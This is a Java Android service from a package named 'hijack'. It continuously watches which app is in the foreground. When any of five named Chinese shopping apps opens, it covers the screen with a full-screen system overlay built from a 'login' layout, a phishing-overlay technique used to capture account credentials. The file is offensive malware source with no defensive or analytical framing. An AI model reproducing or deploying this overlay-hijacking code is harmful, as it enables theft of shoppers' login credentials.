package com.haoren.hijack;

import java.util.Arrays;
import java.util.List;
import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnKeyListener;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;

public class AlertWindow extends Service{
	View view = null;
    WindowManager wm = null;
    View popupWindowView = null;
    private String[] TARGET_APPS = new String[]{"com.achievo.vipshop","com.jingdong.app.mall","com.meilishuo","com.dangdang.buy2","com.mogujie"};
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		doIt();
		return START_NOT_STICKY;
	}
	public void doIt(){
		Thread thread=new Thread(new Runnable()
        {	
            @Override
            public void run()
            {
            	while(true){
            		ActivityManager am = (ActivityManager) getBaseContext().getSystemService (Context.ACTIVITY_SERVICE);
                    ComponentName cn = am.getRunningTasks(1).get(0).topActivity;
                    String packageName = cn.getPackageName();
                    List<String> list = Arrays.asList(TARGET_APPS);
                    if(packageName != null && list.contains(packageName)){
                    	sendMessage("", 1);
                    }
            	}
            }
        });
        thread.start();
	}
	public void addView(){
		view = LayoutInflater.from(getApplicationContext()).inflate(R.layout.login, null);
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        final WindowManager.LayoutParams params = new WindowManager.LayoutParams();
        params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        int flags1 = WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM;
        
        params.flags = flags1;
        params.width = LayoutParams.MATCH_PARENT;
        params.height = LayoutParams.MATCH_PARENT;

        params.gravity = Gravity.CENTER;
    	wm.addView(view, params);
    	view.setOnKeyListener(new OnKeyListener() {
			@Override
            public boolean onKey(View v, int keyCode, KeyEvent event) {
                switch (keyCode) {
                case KeyEvent.KEYCODE_BACK:
                	if(wm != null)
                		wm.removeView(view);
                    return true;
                default:
                    return false;
                }
            }
        });
	}
    public void sendMessage(String msg, int what){
        Bundle data = new Bundle();
        data.putString("msg", msg);
    	Message message=new Message(); 
        message.what = what;
        message.setData(data);
        mHandler.sendMessage(message);
	}
    Handler mHandler = new Handler(){
		@Override
		public void handleMessage(Message msg) {
			switch(msg.what){
			case 1 :
				addView();
				
				break;
			
			default :
				break;
			}
			super.handleMessage(msg);
		}						
	};
	
	@Override
	public void onDestroy() {
		if(wm != null)
			wm.removeView(view);
		super.onDestroy();
	}
	

}
